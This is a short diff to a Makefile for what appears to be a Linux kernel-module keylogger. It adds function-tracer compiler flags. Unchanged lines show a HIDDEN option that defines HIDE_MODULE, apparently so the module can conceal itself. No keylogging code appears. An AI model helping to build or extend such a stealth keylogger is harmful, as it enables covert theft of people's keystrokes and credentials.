@@ -5,8 +5,11 @@ keylog-objs := keylog.o
 
 KVERSION = $(shell uname -r)
 KDIR := /lib/modules/$(KVERSION)/build
-
 KCPPFLAGS=""
+
+ifdef CONFIG_FUNCTION_TRACER
+KCPPFLAGS+=" -DCC_USING_FENTRY -DCONFIG_FUNCTION_TRACER"
+endif
 
 ifdef HIDDEN
 KCPPFLAGS+=" -DHIDE_MODULE -DBUFLEN=2048"
